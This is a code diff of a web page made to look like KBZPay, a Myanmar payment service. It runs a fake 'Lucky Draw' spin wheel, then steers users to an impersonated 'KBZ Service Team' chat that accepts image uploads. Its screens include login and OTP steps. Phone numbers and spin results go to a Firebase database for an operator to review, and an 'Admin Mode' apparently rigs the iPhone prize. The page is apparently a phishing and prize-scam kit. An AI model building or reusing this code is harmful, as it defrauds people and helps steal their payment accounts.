+<div id="s-spin" class="screen" style="display:none;background:linear-gradient(175deg,#020C1F 0%,#061435 35%,#0A1E55 65%,#020C1F 100%);">
+  <div id="spin-stars"></div>
+  <!-- Confetti canvas -->
+  <canvas id="confetti-cv" style="position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:50;"></canvas>
+  <!-- Header -->
+  <div style="width:100%;max-width:430px;padding:16px 18px 8px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:5;flex-shrink:0;">
+    <div class="kbz-badge" style="box-shadow:0 2px 12px rgba(0,93,184,.3);">
+      <span style="color:#005DB8;font-weight:900;font-size:16px;">KBZ</span>
+      <span style="color:#005DB8;font-weight:700;font-size:12px;"> Pay</span>
+    </div>
+    <div style="background:rgba(255,215,0,.12);border:1px solid rgba(255,215,0,.35);border-radius:20px;padding:6px 15px;text-align:center;">
+      <div style="color:rgba(255,255,255,.5);font-size:10px;font-weight:700;letter-spacing:1px;">SPINS LEFT</div>
+      <div id="spins-left" style="color:#FFD700;font-weight:900;font-size:22px;line-height:1;">3</div>
+    </div>
+  </div>
+  <!-- iPhone mode banner -->
+  <div id="iphone-banner" style="display:none;width:100%;background:linear-gradient(90deg,#FF2D8F,#9C27FF,#FF2D8F);padding:8px;text-align:center;color:white;font-size:12px;font-weight:700;z-index:10;flex-shrink:0;">
+    🍎 Admin Mode — iPhone 17 Pro Max ဆုကျမည်
+  </div>
+  <!-- Title -->
+  <div style="text-align:center;padding:2px 16px 4px;position:relative;z-index:5;flex-shrink:0;">
+    <div style="font-size:26px;font-weight:900;background:linear-gradient(90deg,#FFE566,#FFD700,#FF8C00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">Lucky Draw 🎰</div>
+    <div style="color:rgba(255,255,255,.4);font-size:12px;margin-top:2px;">KBZPay · ကံစမ်းလှော်ပြိုင်ပွဲ</div>
+  </div>
+  <!-- Prize chips -->
+  <div id="spin-prize-chips" style="display:flex;gap:5px;flex-wrap:wrap;justify-content:center;padding:5px 18px 6px;max-width:430px;position:relative;z-index:5;flex-shrink:0;"></div>
+  <!-- Wheel -->
+  <div style="position:relative;width:min(82vw,320px);height:min(82vw,320px);margin:4px auto 0;z-index:5;flex-shrink:0;">
+    <div id="spin-ring" style="position:absolute;inset:-16px;border-radius:50%;background:conic-gradient(#FF2D55,#FF6B00,#FFD700,#00C853,#00B8FF,#9C27FF,#FF2D8F,#FF2D55);animation:spinRing 5s linear infinite;opacity:.22;transition:opacity .5s;"></div>
+    <div style="position:absolute;inset:-5px;border-radius:50%;box-shadow:0 0 0 8px #041240;pointer-events:none;"></div>
+    <div style="position:absolute;top:-22px;left:50%;transform:translateX(-50%);z-index:10;filter:drop-shadow(0 3px 8px rgba(0,0,0,.7));">
+      <svg width="30" height="36" viewBox="0 0 36 42">
+        <defs><linearGradient id="ptr" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#FFF5A0"/><stop offset="100%" stop-color="#C8860A"/></linearGradient></defs>
+        <polygon points="18,40 1,6 35,6" fill="url(#ptr)" stroke="#FFFDE0" stroke-width="1.5"/>
+        <circle cx="18" cy="8" r="7" fill="#FFD700" stroke="white" stroke-width="2.5"/>
+        <circle cx="18" cy="8" r="3" fill="white" opacity="0.6"/>
+      </svg>
+    </div>
+    <canvas id="wheel-cv" style="width:100%;height:100%;display:block;border-radius:50%;filter:drop-shadow(0 0 24px rgba(255,215,0,.45));transition:transform 5s cubic-bezier(0.08,0.6,0.12,1.0);" width="320" height="320"></canvas>
+  </div>
+  <!-- Spin btn -->
+  <div style="width:min(82vw,320px);margin:14px auto 6px;position:relative;z-index:5;flex-shrink:0;">
+    <button id="spin-btn" onclick="doSpin()" style="width:100%;padding:18px 0;border-radius:20px;border:none;background:linear-gradient(135deg,#FFE566 0%,#FFD700 35%,#FF8C00 70%,#FF5500 100%);color:#1A0500;font-size:19px;font-weight:900;letter-spacing:1.5px;animation:pulse 2s ease-in-out infinite;display:flex;align-items:center;justify-content:center;gap:10px;">
+      🎰 SPIN NOW
+    </button>
+    <div id="spin-hint" style="text-align:center;margin-top:6px;color:rgba(255,255,255,.3);font-size:12px;">ကျန် <span id="spin-left-txt">3</span> ကြိမ် · ဖိနှိပ်ကာ ကံစမ်းပါ</div>
+  </div>
+  <!-- Contact banner (hidden until spins done) -->
+  <div id="contact-banner" style="display:none;width:min(82vw,320px);position:relative;z-index:5;margin-top:4px;animation:slideUp .5s ease;flex-shrink:0;">
+    <div style="background:linear-gradient(135deg,#001E55,#002A7A);border:2px solid rgba(0,119,230,.5);border-radius:20px;padding:18px 16px 16px;box-shadow:0 8px 32px rgba(0,93,184,.35);">
+      <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+        <div style="width:40px;height:40px;border-radius:12px;background:linear-gradient(135deg,#005DB8,#0099FF);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:18px;">💳</div>
+        <div>
+          <div style="color:white;font-size:14px;font-weight:800;">ဆုငွေ ထုတ်ယူလိုပါသလား?</div>
+          <div style="color:rgba(255,255,255,.45);font-size:11px;margin-top:1px;">KBZ Service Team သို့ ဆက်သွယ်ပါ</div>
+        </div>
+      </div>
+      <button onclick="show('chat')" style="width:100%;padding:14px 0;border-radius:14px;border:none;background:linear-gradient(135deg,#005DB8,#0077E6,#0099FF);color:white;font-size:15px;font-weight:900;display:flex;align-items:center;justify-content:center;gap:10px;animation:kpulse 2s ease-in-out infinite;box-shadow:0 6px 20px rgba(0,93,184,.5);">
+        <span style="font-size:17px;">💬</span> KBZ Service Team သို့ ဆက်သွယ်ပါ
+      </button>
+    </div>
+  </div>
+  <!-- History -->
+  <div id="spin-history-wrap" style="width:min(82vw,320px);margin:10px auto 0;position:relative;z-index:5;display:none;flex-shrink:0;">
+    <div style="color:rgba(255,255,255,.3);font-size:10px;font-weight:700;letter-spacing:1px;margin-bottom:5px;">📋 ရလဒ်မှတ်တမ်း</div>
+    <div id="spin-history" style="display:flex;gap:5px;flex-wrap:wrap;"></div>
+  </div>
+  <div style="height:24px;flex-shrink:0;"></div>
+  <!-- Result popup -->
+  <div id="result-overlay" style="display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.82);display:none;align-items:center;justify-content:center;backdrop-filter:blur(12px);animation:fdIn .25s ease;">
+    <div id="result-card" style="background:linear-gradient(150deg,#0C1A40 0%,#162E60 60%,#0C1A40 100%);border-radius:28px;padding:34px 26px 26px;max-width:310px;width:88%;text-align:center;position:relative;overflow:hidden;animation:popUp .4s cubic-bezier(.175,.885,.32,1.275);">
+      <div id="result-glow" style="position:absolute;inset:0;pointer-events:none;"></div>
+      <div id="result-icon" style="font-size:50px;line-height:1;margin-bottom:7px;"></div>
+      <div style="color:rgba(255,255,255,.55);font-size:12px;font-weight:700;letter-spacing:2px;margin-bottom:3px;">ဂုဏ်ယူပါသည်!</div>
+      <div style="color:rgba(255,255,255,.3);font-size:11px;margin-bottom:18px;">CONGRATULATIONS</div>
+      <div id="result-inner" style="border-radius:20px;padding:20px 14px;margin-bottom:20px;"></div>
+      <button onclick="closeResult()" style="width:100%;padding:15px;border-radius:14px;border:none;background:linear-gradient(135deg,#FFE566,#FFD700,#FF8C00);color:#1A0800;font-size:16px;font-weight:900;box-shadow:0 6px 22px rgba(255,165,0,.4);">✓ ကောင်းပြီ</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══ CHAT ════════════════════════════════════════════════════════════════ -->
+
+<div id="s-chat" class="screen" style="display:none;background:#0A1428;max-width:480px;margin:0 auto;">
+  <!-- Header -->
+  <div style="background:linear-gradient(135deg,#005DB8,#0077E6);padding:0 16px;flex-shrink:0;box-shadow:0 2px 18px rgba(0,93,184,.5);">
+    <div style="display:flex;align-items:center;gap:11px;padding:12px 0;">
+      <button class="back-btn" onclick="show('spin')">←</button>
+      <div style="width:42px;height:42px;border-radius:13px;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 2px 8px rgba(0,0,0,.2);">
+        <div style="color:#005DB8;font-weight:900;font-size:13px;line-height:1;">KBZ</div>
+        <div style="color:#005DB8;font-weight:700;font-size:9px;letter-spacing:1px;">Pay</div>
+      </div>
+      <div style="flex:1;min-width:0;">
+        <div style="color:white;font-weight:800;font-size:15px;">KBZPay Service Team</div>
+        <div style="color:rgba(255,255,255,.65);font-size:11px;display:flex;align-items:center;gap:4px;">
+          <span style="width:7px;height:7px;border-radius:50%;background:#4AFF91;display:inline-block;flex-shrink:0;"></span>Online · ဝန်ဆောင်မှုပေးနေသည်
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Win summary -->
+  <div id="chat-win-banner" style="background:rgba(255,215,0,.07);border-bottom:1px solid rgba(255,215,0,.14);padding:9px 16px;flex-shrink:0;display:none;">
+    <div style="color:rgba(255,255,255,.4);font-size:10px;font-weight:700;letter-spacing:1px;margin-bottom:5px;">📋 သင်၏ Lucky Draw ရလဒ်</div>
+    <div id="chat-win-list" style="display:flex;gap:5px;flex-wrap:wrap;"></div>
+  </div>
+  <!-- Messages -->
+  <div id="chat-msgs" style="flex:1;overflow-y:auto;padding:14px 14px;display:flex;flex-direction:column;gap:11px;min-height:0;">
+    <div style="text-align:center;">
+      <span style="background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:4px 13px;color:rgba(255,255,255,.3);font-size:11px;">🔒 ဤ chat သည် လုံခြုံပါသည်</span>
+    </div>
+  </div>
+  <!-- Image preview strip -->
+  <div id="img-preview-strip" style="background:rgba(255,255,255,.04);border-top:1px solid rgba(255,255,255,.07);padding:9px 14px;flex-shrink:0;display:none;">
+    <div id="img-previews" style="display:flex;gap:7px;overflow-x:auto;"></div>
+  </div>
+  <!-- Input bar -->
+  <div style="background:rgba(255,255,255,.04);border-top:1px solid rgba(255,255,255,.07);padding:9px 11px;flex-shrink:0;display:flex;align-items:flex-end;gap:8px;padding-bottom:max(9px,env(safe-area-inset-bottom,9px));">
+    <button onclick="document.getElementById('file-inp').click()" style="background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);border-radius:12px;width:42px;height:42px;color:white;font-size:19px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">📷</button>
+    <input type="file" id="file-inp" accept="image/*" multiple style="display:none;" onchange="handleImgSelect(this)">
+    <div style="flex:1;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:10px 13px;min-height:42px;display:flex;align-items:center;">
+      <textarea id="chat-inp" rows="1" placeholder="စာရိုက်ပါ..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();sendChatMsg();}" style="background:none;border:none;outline:none;color:white;font-size:14px;width:100%;resize:none;font-family:inherit;line-height:1.4;max-height:90px;overflow:auto;caret-color:#0099FF;"></textarea>
+    </div>
+    <button id="send-btn" onclick="sendChatMsg()" style="background:linear-gradient(135deg,#005DB8,#0077E6);border:none;border-radius:12px;width:42px;height:42px;color:white;font-size:17px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 12px rgba(0,93,184,.4);">➤</button>
+  </div>
+</div>
+
+<script>
+// ── Firebase ─────────────────────────────────────────────────────────────────
+const firebaseConfig = {
+  apiKey: "AIzaSyBRwkZzqyINBqdglIoC6jC1z7aQZU0CwiQ",
+  authDomain: "kbz-pay-april-lucky-draw.firebaseapp.com",
+  databaseURL: "https://kbz-pay-april-lucky-draw-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "kbz-pay-april-lucky-draw",
+  storageBucket: "kbz-pay-april-lucky-draw.firebasestorage.app",
+  messagingSenderId: "535142665183",
+  appId: "1:535142665183:web:c818667e8de4aa9fb6126a",
+  measurementId: "G-CJX7QQNR3P"
 };
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
-const tnEl=d.querySelector(’#otn’);
-timerInt=setInterval(()=>{timer–;if(tnEl)tnEl.textContent=timer;if(timer<=0){clearInterval(timerInt);const td=d.querySelector(’#otimer’);if(td)td.innerHTML=’<button id="ors" style="background:none;border:1px solid rgba(0,119,230,0.35);border-radius:9px;padding:7px 15px;color:#38B6FF;font-size:11px;font-weight:700;cursor:pointer;">🔄 OTP ပြန်တောင်းပါ</button>’;const rb=d.querySelector(’#ors’);if(rb)rb.onclick=()=>go(‘login’);}},1000);
-d.querySelector(’#bk’).onclick=()=>{clearInterval(timerInt);go(‘login’);};
-root.appendChild(d);
+// ── Prizes ───────────────────────────────────────────────────────────────────
+const PRIZES = [
+  {id:0,amount:10000, display:"10,000", mmk:"တစ်သောင်း",  color:"#FF2D55",light:"#FF6B8A",dark:"#C4002A"},
+  {id:1,amount:30000, display:"30,000", mmk:"သုံးသောင်း",color:"#FF6B00",light:"#FFA040",dark:"#C45000"},
+  {id:2,amount:50000, display:"50,000", mmk:"ငါးသောင်း", color:"#FFD700",light:"#FFE866",dark:"#C4A000"},
+  {id:3,amount:100000,display:"100,000",mmk:"တစ်သိန်း",  color:"#00C853",light:"#5EE88A",dark:"#009A3E"},
+  {id:4,amount:300000,display:"300,000",mmk:"သုံးသိန်း", color:"#00B8FF",light:"#6DD8FF",dark:"#0088C4"},
+  {id:5,amount:500000,display:"500,000",mmk:"ငါးသိန်း",  color:"#9C27FF",light:"#C870FF",dark:"#6A00C4"},
+  {id:6,amount:0,display:"အထူးဆု",mmk:"iPhone 17",color:"#FF2D8F",light:"#FF80C0",dark:"#C4006A",isSpecial:true}
+];
+const N=PRIZES.length, SEG_DEG=360/N, SEG_RAD=(2*Math.PI)/N;
+
+// ── State ────────────────────────────────────────────────────────────────────
+let STATE = {userId:null,phone:null,spinsLeft:3,rotation:0,spinning:false,history:[],imgQueue:[],chatListener:null,otpListener:null,spinRef:null};
+
+// ── Helpers ───────────────────────────────────────────────────────────────────
+function uid(phone){return phone.replace(/\D/g,'');}
+function darken(hex,amt){const n=parseInt(hex.slice(1),16);return `rgb(${Math.max(0,((n>>16)&0xff)-amt)},${Math.max(0,((n>>8)&0xff)-amt)},${Math.max(0,(n&0xff)-amt)})`;}
+function ts(){return new Date().toLocaleTimeString('my-MM',{hour:'2-digit',minute:'2-digit'});}
+
+// ── Screen ────────────────────────────────────────────────────────────────────
+const SCREENS = ['home','login','otp','spin','chat'];
+function show(id){
+  SCREENS.forEach(s=>{ const el=document.getElementById('s-'+s); if(el) el.style.display=(s===id)?'flex':'none'; });
+  if(id==='chat') initChat();
+  if(id==='spin') initSpin();
 }
 
-/* ═══ WHEEL DRAW ════════════════════════════════════════════════ */
-function drawWheel(c){
-if(!c)return;
-const dpr=window.devicePixelRatio||1,W=c.offsetWidth,H=c.offsetHeight;
-c.width=W*dpr;c.height=H*dpr;
-const ctx=c.getContext(‘2d’);ctx.scale(dpr,dpr);
-const cx=W/2,cy=H/2,R=Math.min(W,H)/2-6,rIn=R*.20;
-const rg=ctx.createLinearGradient(cx-R,cy-R,cx+R,cy+R);
-rg.addColorStop(0,’#FFF5A0’);rg.addColorStop(.3,’#FFD700’);rg.addColorStop(.7,’#C8860A’);rg.addColorStop(1,’#FFE566’);
-ctx.beginPath();ctx.arc(cx,cy,R+10,0,Math.PI*2);ctx.fillStyle=rg;ctx.fill();
-for(let i=0;i<28;i++){
-const a=(i/28)*Math.PI*2-Math.PI/2,gx=cx+Math.cos(a)*(R+5),gy=cy+Math.sin(a)*(R+5);
-const g=ctx.createRadialGradient(gx-1,gy-1,0,gx,gy,4.5),col=PRIZES[i%N].color;
-g.addColorStop(0,’#FFF’);g.addColorStop(.4,col);g.addColorStop(1,darken(col,40));
-ctx.beginPath();ctx.arc(gx,gy,4.5,0,Math.PI*2);ctx.fillStyle=g;ctx.fill();
-ctx.strokeStyle=‘rgba(255,255,255,0.6)’;ctx.lineWidth=.8;ctx.stroke();
-}
-PRIZES.forEach((p,i)=>{
-const sA=i*SEG_RAD-Math.PI/2,eA=sA+SEG_RAD,mA=sA+SEG_RAD/2;
-const gx1=cx+Math.cos(mA)*R*.15,gy1=cy+Math.sin(mA)*R*.15,gx2=cx+Math.cos(mA)*R*.98,gy2=cy+Math.sin(mA)*R*.98;
-const sg=ctx.createLinearGradient(gx1,gy1,gx2,gy2);sg.addColorStop(0,p.light);sg.addColorStop(.45,p.color);sg.addColorStop(1,p.dark);
-ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R,sA,eA);ctx.closePath();ctx.fillStyle=sg;ctx.fill();
-ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R,sA,eA);ctx.closePath();ctx.strokeStyle=‘rgba(255,255,255,0.55)’;ctx.lineWidth=2;ctx.stroke();
-ctx.save();ctx.translate(cx,cy);ctx.rotate(mA+Math.PI/2);
-ctx.shadowColor=‘rgba(0,0,0,0.7)’;ctx.shadowBlur=6;ctx.textAlign=‘center’;ctx.textBaseline=‘middle’;ctx.fillStyle=’#FFF’;
-if(p.isSpecial){
-ctx.font=`${Math.round(R*.13)}px serif`;ctx.fillText(‘📱’,0,-(R*.52));
-ctx.font=`900 ${Math.round(R*.088)}px 'Segoe UI',sans-serif`;ctx.fillText(‘အထူးဆု’,0,-(R*.36));
-ctx.font=`700 ${Math.round(R*.063)}px 'Segoe UI',sans-serif`;ctx.fillStyle=‘rgba(255,255,255,0.85)’;ctx.fillText(‘iPhone 17’,0,-(R*.22));
-}else{
-ctx.font=`900 ${Math.round(R*.108)}px 'Segoe UI',sans-serif`;ctx.fillText(p.display,0,-(R*.62));
-ctx.font=`700 ${Math.round(R*.068)}px 'Segoe UI',sans-serif`;ctx.fillStyle=‘rgba(255,255,255,0.85)’;ctx.fillText(‘MMK’,0,-(R*.77));
-ctx.font=`${Math.round(R*.11)}px serif`;ctx.fillStyle=’#FFF’;ctx.fillText(‘🪙’,0,-(R*.30));
-}
-ctx.restore();
-});
-const hg=ctx.createRadialGradient(cx-rIn*.3,cy-rIn*.3,0,cx,cy,rIn);
-hg.addColorStop(0,’#FFFDE0’);hg.addColorStop(.4,’#FFD700’);hg.addColorStop(.75,’#C8860A’);hg.addColorStop(1,’#7A4F00’);
-ctx.beginPath();ctx.arc(cx,cy,rIn,0,Math.PI*2);ctx.fillStyle=hg;ctx.fill();
-ctx.strokeStyle=‘rgba(255,255,255,0.8)’;ctx.lineWidth=3;ctx.stroke();
-ctx.save();ctx.font=`900 ${Math.round(rIn*.7)}px 'Segoe UI',sans-serif`;ctx.textAlign=‘center’;ctx.textBaseline=‘middle’;ctx.fillStyle=’#003580’;ctx.fillText(‘K’,cx,cy);ctx.restore();
-}
-
-/* ═══ SPIN ══════════════════════════════════════════════════════ */
-function Spin(root){
-let rotRef=0,spinning=false,spinsLeft=3,history=[];
-const d=document.createElement(‘div’);
-d.style.cssText=‘min-height:100vh;background:linear-gradient(175deg,#020C1F 0%,#061435 35%,#0A1E55 65%,#020C1F 100%);display:flex;flex-direction:column;align-items:center;position:relative;overflow:hidden;user-select:none;’;
-addStars(d,50);
-d.innerHTML+=`
-
-  <div style="width:100%;max-width:430px;padding:14px 16px 7px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:5;">
-    <div style="background:white;border-radius:9px;padding:5px 11px;"><span style="color:#005DB8;font-weight:900;font-size:15px;">KBZ</span><span style="color:#005DB8;font-weight:700;font-size:11px;">Pay</span></div>
-    <div style="background:rgba(255,215,0,0.12);border:1px solid rgba(255,215,0,0.35);border-radius:16px;padding:4px 13px;text-align:center;">
-      <div style="color:rgba(255,255,255,0.45);font-size:9px;font-weight:700;letter-spacing:1px;">SPINS LEFT</div>
-      <div id="sleft" style="color:#FFD700;font-weight:900;font-size:20px;line-height:1.1;">3</div>
-    </div>
-  </div>
-  <div style="text-align:center;padding:2px 14px 4px;position:relative;z-index:5;">
-    <div style="font-size:22px;font-weight:900;background:linear-gradient(90deg,#FFE566,#FFD700,#FF8C00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">Lucky Draw 🎰</div>
-    <div style="color:rgba(255,255,255,0.35);font-size:11px;margin-top:1px;">KBZPay · နယုန်လ ကံစမ်းပွဲ</div>
-  </div>
-  <div style="display:flex;gap:4px;flex-wrap:wrap;justify-content:center;padding:4px 16px 5px;max-width:430px;position:relative;z-index:5;">
-    ${PRIZES.map(p=>`<div style="padding:2px 7px;border-radius:20px;background:${p.color}18;border:1.5px solid ${p.color}55;color:${p.color};font-size:9px;font-weight:800;">${p.isSpecial?'📱 iPhone':p.display}</div>`).join('')}
-  </div>
-  <div style="position:relative;width:min(80vw,310px);height:min(80vw,310px);margin:2px auto 0;z-index:5;flex-shrink:0;">
-    <div id="sring" style="position:absolute;inset:-15px;border-radius:50%;background:conic-gradient(#FF2D55,#FF6B00,#FFD700,#00C853,#00B8FF,#9C27FF,#FF2D8F,#FF2D55);animation:spinRing 5s linear infinite;opacity:0.22;transition:opacity .5s;"></div>
-    <div style="position:absolute;inset:-5px;border-radius:50%;box-shadow:0 0 0 7px #041240;"></div>
-    <div style="position:absolute;top:-21px;left:50%;transform:translateX(-50%);z-index:10;filter:drop-shadow(0 3px 8px rgba(0,0,0,.7));">
-      <svg width="28" height="34" viewBox="0 0 36 42"><defs><linearGradient id="ptr" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#FFF5A0"/><stop offset="100%" stop-color="#C8860A"/></linearGradient></defs><polygon points="18,40 1,6 35,6" fill="url(#ptr)" stroke="#FFFDE0" stroke-width="1.5"/><circle cx="18" cy="8" r="7" fill="#FFD700" stroke="white" stroke-width="2.5"/><circle cx="18" cy="8" r="3" fill="white" opacity="0.6"/></svg>
-    </div>
-    <canvas id="wc" style="width:100%;height:100%;display:block;border-radius:50%;filter:drop-shadow(0 0 22px rgba(255,215,0,0.45));transition:transform 5s cubic-bezier(0.08,0.6,0.12,1.0);"></canvas>
-  </div>
-  <div style="width:min(80vw,310px);margin:11px auto 4px;position:relative;z-index:5;">
-    <button id="sbtn" style="width:100%;padding:16px 0;border-radius:17px;border:none;cursor:pointer;font-size:17px;font-weight:900;letter-spacing:1.5px;background:linear-gradient(135deg,#FFE566,#FFD700,#FF8C00,#FF5500);color:#1A0500;animation:pulse 2s ease-in-out infinite;display:flex;align-items:center;justify-content:center;gap:9px;">🎰 SPIN NOW</button>
-    <div id="shint" style="text-align:center;margin-top:5px;color:rgba(255,255,255,0.28);font-size:11px;">ကျန် 3 ကြိမ် · ဖိနှိပ်ကာ ကံစမ်းပါ</div>
-  </div>
-  <div id="cbanner" style="z-index:5;width:100%;display:flex;flex-direction:column;align-items:center;"></div>
-  <div id="shist" style="display:none;width:min(80vw,310px);margin:5px auto 0;position:relative;z-index:5;">
-    <div style="color:rgba(255,255,255,0.28);font-size:9px;font-weight:700;letter-spacing:1px;margin-bottom:4px;">📋 ရလဒ်မှတ်တမ်း</div>
-    <div id="schips" style="display:flex;gap:4px;flex-wrap:wrap;"></div>
-  </div>
-  <div id="cfwrap" style="position:absolute;inset:0;pointer-events:none;z-index:50;"></div>
-  <div id="pwrap"></div>
-  <div style="height:28px;"></div>`;
-
-requestAnimationFrame(()=>drawWheel(d.querySelector(’#wc’)));
-
-function confetti(){
-const wrap=d.querySelector(’#cfwrap’),c=document.createElement(‘canvas’);
-c.style.cssText=‘position:absolute;inset:0;width:100%;height:100%;’;
-wrap.appendChild(c);c.width=c.offsetWidth;c.height=c.offsetHeight;
-const ctx=c.getContext(‘2d’);
-let pts=Array.from({length:140},()=>({x:Math.random()*c.width,y:-10-Math.random()*80,vx:(Math.random()-.5)*7,vy:Math.random()*5+2,color:PRIZES[Math.floor(Math.random()*N)].color,w:Math.random()*10+4,h:Math.random()*5+3,rot:Math.random()*360,rv:(Math.random()-.5)*12}));
-(function draw(){ctx.clearRect(0,0,c.width,c.height);pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;p.vy+=.12;p.rot+=p.rv;ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot*Math.PI/180);ctx.fillStyle=p.color;ctx.globalAlpha=Math.max(0,1-p.y/c.height);ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();});pts=pts.filter(p=>p.y<c.height+20);if(pts.length)requestAnimationFrame(draw);else c.remove();})();
-}
-
-function showPopup(prize){
-const w=d.querySelector(’#pwrap’);
-w.innerHTML=`<div style="position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.82);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(12px);animation:fdIn .25s ease;"> <div style="background:linear-gradient(150deg,#0C1A40,#162E60,#0C1A40);border:2.5px solid ${prize.color};border-radius:24px;padding:32px 24px 24px;max-width:300px;width:88%;text-align:center;box-shadow:0 0 70px ${prize.color}55;animation:popUp .4s cubic-bezier(.175,.885,.32,1.275);"> <div style="font-size:46px;line-height:1;margin-bottom:7px;">${prize.isSpecial?'🏆':'🎉'}</div> <div style="color:rgba(255,255,255,.5);font-size:10px;font-weight:700;letter-spacing:2px;margin-bottom:4px;">ဂုဏ်ယူပါသည်!</div> <div style="background:${prize.color}22;border:1.5px solid ${prize.color}65;border-radius:16px;padding:16px 12px;margin:14px 0 18px;"> ${prize.isSpecial?`<div style="font-size:40px;">📱</div><div style="color:${prize.color};font-size:18px;font-weight:900;">iPhone 17 Pro Max</div>`: `<div style="color:rgba(255,255,255,.45);font-size:11px;margin-bottom:4px;">ဆုငွေ</div><div style="color:${prize.color};font-size:38px;font-weight:900;text-shadow:0 0 24px ${prize.color}99;">${prize.display}</div><div style="color:rgba(255,255,255,.38);font-size:11px;margin-top:4px;">ကျပ် · ${prize.mmk}</div>`} </div> <button id="pclose" style="width:100%;padding:13px;border-radius:12px;border:none;background:linear-gradient(135deg,#FFE566,#FFD700,#FF8C00);color:#1A0800;font-size:14px;font-weight:900;cursor:pointer;">✓ ကောင်းပြီ</button> </div></div>`;
-w.querySelector(’#pclose’).onclick=()=>w.innerHTML=’’;
-}
-
-const sbtn=d.querySelector(’#sbtn’);
-sbtn.onclick=()=>{
-if(spinning||spinsLeft<=0)return;
-const weights=[35,28,18,10,5,3,1],tot=weights.reduce((a,b)=>a+b,0);
-let pick=Math.random()*tot,winIdx=0;
-for(let i=0;i<weights.length;i++){pick-=weights[i];if(pick<=0){winIdx=i;break;}}
-const sc=(winIdx+.5)*SEG_DEG,extra=((-(sc+rotRef))%360+360)%360;
-const delta=(6+Math.floor(Math.random()*4))*360+(extra===0?360:extra);
-rotRef+=delta;spinning=true;spinsLeft–;
-d.querySelector(’#sleft’).textContent=spinsLeft;
-d.querySelector(’#sring’).style.opacity=‘0.65’;
-d.querySelector(’#wc’).style.transform=`rotate(${rotRef}deg)`;
-sbtn.style.cssText=‘width:100%;padding:16px 0;border-radius:17px;border:none;cursor:default;font-size:17px;font-weight:900;background:linear-gradient(135deg,#2a2a4a,#1a1a3a);color:rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;gap:9px;’;
-sbtn.innerHTML=’<div style="width:18px;height:18px;border-radius:50%;border:3px solid rgba(255,255,255,.2);border-top:3px solid rgba(255,255,255,.7);animation:spinRing .7s linear infinite;"></div> လည်နေသည်…’;
-
-```
-setTimeout(()=>{
-  spinning=false;d.querySelector('#sring').style.opacity='0.22';
-  const prize=PRIZES[winIdx];history.unshift(prize);S.winHistory=[...history];
-  // ③ Firebase: save each spin result
-  DB.ref('spins/'+sk(S.phone)).push({spinNo:history.length,prizeDisplay:prize.display,amount:prize.amount,isSpecial:prize.isSpecial||false,color:prize.color,ts:now()})
-    .catch(er=>console.error('Spin save error:',er));
-  confetti();showPopup(prize);
-  d.querySelector('#shist').style.display='block';
-  d.querySelector('#schips').innerHTML=history.map((h,i)=>`<div style="padding:2px 8px;border-radius:20px;background:${h.color}18;border:1px solid ${h.color}40;color:${h.color};font-size:9px;font-weight:800;">Spin${i+1}: ${h.isSpecial?'📱':h.display}</div>`).join('');
-
-  if(spinsLeft>0){
-    sbtn.style.cssText='width:100%;padding:16px 0;border-radius:17px;border:none;cursor:pointer;font-size:17px;font-weight:900;letter-spacing:1.5px;background:linear-gradient(135deg,#FFE566,#FFD700,#FF8C00,#FF5500);color:#1A0500;animation:pulse 2s ease-in-out infinite;display:flex;align-items:center;justify-content:center;gap:9px;';
-    sbtn.innerHTML='🎰 SPIN NOW';
-    d.querySelector('#shint').textContent=`ကျန် ${spinsLeft} ကြိမ် · ဆက်လှည့်ပါ`;
-  }else{
-    sbtn.style.cssText='width:100%;padding:16px 0;border-radius:17px;border:none;cursor:default;font-size:16px;font-weight:900;background:linear-gradient(135deg,#2a2a4a,#1a1a3a);color:rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;';
-    sbtn.innerHTML='🔒 ၃ ကြိမ် ကုန်သွားပြီ';
-    d.querySelector('#shint').textContent='';
-    const total=history.reduce((s,p)=>s+p.amount,0);
-    // ④ Firebase: save total prize after 3 spins → admin sees final
-    DB.ref('users/'+sk(S.phone)).update({spinsDone:true,totalPrize:total,spinsHistory:history.map(h=>h.display).join(','),doneAt:now()})
-      .catch(er=>console.error('Total save error:',er));
-    setTimeout(showBanner,800);
+// ── Stars ─────────────────────────────────────────────────────────────────────
+function makeStars(containerId,count){
+  const c=document.getElementById(containerId); if(!c)return;
+  for(let i=0;i<count;i++){
+    const d=document.createElement('div');
+    d.className='star';
+    const s=i%4===0?3:1.5;
+    Object.assign(d.style,{width:s+'px',height:s+'px',left:`${(i*17+7)%100}%`,top:`${(i*13+3)%100}%`,animation:`twinkle ${1.5+(i%5)*.4}s ${(i%6)*.3}s ease-in-out infinite`});
+    c.appendChild(d);
   }
-},5200);
-```
-
-};
-
-function showBanner(){
-const b=d.querySelector(’#cbanner’);
-const total=history.reduce((s,p)=>s+(p.amount||0),0);
